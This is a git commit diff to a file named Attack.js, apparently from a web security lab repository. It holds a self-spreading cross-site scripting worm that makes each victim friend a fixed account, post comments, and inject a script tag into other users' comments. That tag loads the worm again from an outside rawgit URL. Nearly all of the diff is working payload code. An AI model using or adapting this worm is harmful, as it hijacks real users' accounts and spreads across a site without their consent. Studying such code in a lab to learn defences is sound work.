8c91d072f34490819aaea96be3bb4f2a20278723
JonLMyers <jlm4508@g.rit.com>
2016-11-29 18:41:57 -0500

    update

--- Attack.js
+++ Attack.js
@@ -1,4 +1,5 @@
-function fight(){  
+<script>
+function fight(){
   $.get("add_friend.php?id=114");
   $.get('add_comment.php?id=114&comment='.concat(Date()));
   $.get("home.php", function(data, status){
@@ -6,8 +7,11 @@ function fight(){
     var ids = data.substr(ln, 6);
     var id = ids.match(/\d+/)[0];
     var a = 'add_comment.php?id='.concat(id);
-    var b = '&comment=<script>').concat(fight.toString()).concat('fight();<\/script>');
+    var b = '&comment=<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js">').concat('<\/script>');
     $.get(a+b);
     });
 }
 fight();
+</script>
+//<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js"></script>
+//https://drive.google.com/host/0B_BwSrIRFmFza01yWEV3aWQ2eHM
